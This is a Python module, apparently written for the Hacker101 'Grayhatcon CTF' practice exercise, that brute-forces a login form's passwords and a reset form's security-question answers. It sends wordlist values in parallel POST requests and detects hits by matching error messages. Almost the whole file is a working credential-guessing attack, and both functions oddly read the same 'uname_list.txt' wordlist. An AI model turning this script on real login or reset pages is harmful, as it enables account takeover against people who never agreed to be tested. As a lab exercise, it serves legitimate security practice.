"""
Hacker 101 CTF exercise "Grayhatcon CTF" password and security question cracker.
"""

from bruting import http as h
from core.conf.http import HttpRequest
from core.constants.http import Protocol, HttpMethod, ContentType, HeaderField
from util.matching import http_resp_content_regex_flagger as f

PROTOCOL = Protocol.HTTP
ENDPOINT_LOGIN = "login"
ENDPOINT_RESET = "reset"
USERNAME_FIELD = "username"
PASSWORD_FIELD = "password"
ACCOUNT_FIELD = "account_hash"
ANSWER_FIELD = "answer"
HEADERS = {
    HeaderField.CONTENT_TYPE.value: ContentType.FORM_URL.value[0],
    HeaderField.ACCEPT.value: ContentType.HTML.value[0]
}


def crack_password(ip, instance_id, username):
    """
    Enumerates common passwords and returns the valid ones after trying. A valid username is required.
    :param ip:
    :param instance_id:
    :param username:
    :return:
    """
    path = "/".join((instance_id, ENDPOINT_LOGIN))
    req_template = HttpRequest(ip, method=HttpMethod.POST, path=path, headers=HEADERS)
    regex = r"Combination is invalid"
    passwd_req_gen = get_passwd_func(username)
    return h.parallel_attack(req_template, passwd_req_gen, f(regex, True), data_file="uname_list.txt", threads=10)


def crack_security_question(ip, instance_id, user_hash):
    """
    Enumerates common answers to a security question and returns the valid ones after trying. A valid user hash is
    required.
    :param ip:
    :param instance_id:
    :param user_hash:
    :return:
    """
    path = "/".join((instance_id, ENDPOINT_RESET))
    req_template = HttpRequest(ip, method=HttpMethod.POST, path=path, headers=HEADERS)
    regex = r"Invalid answer"
    reset_req_gen = get_reset_func(user_hash)
    return h.parallel_attack(req_template, reset_req_gen, f(regex, True), data_file="uname_list.txt", threads=10)


def get_passwd_func(username):
    def generate_passwd_req(template, value):
        target = template.clone()
        body = {USERNAME_FIELD: str(username), PASSWORD_FIELD: str(value)}
        target.body = body
        return target

    return generate_passwd_req


def get_reset_func(user_hash):
    def generate_reset_req(template, value):
        target = template.clone()
        body = {ACCOUNT_FIELD: str(user_hash), ANSWER_FIELD: str(value)}
        target.body = body
        return target

    return generate_reset_req
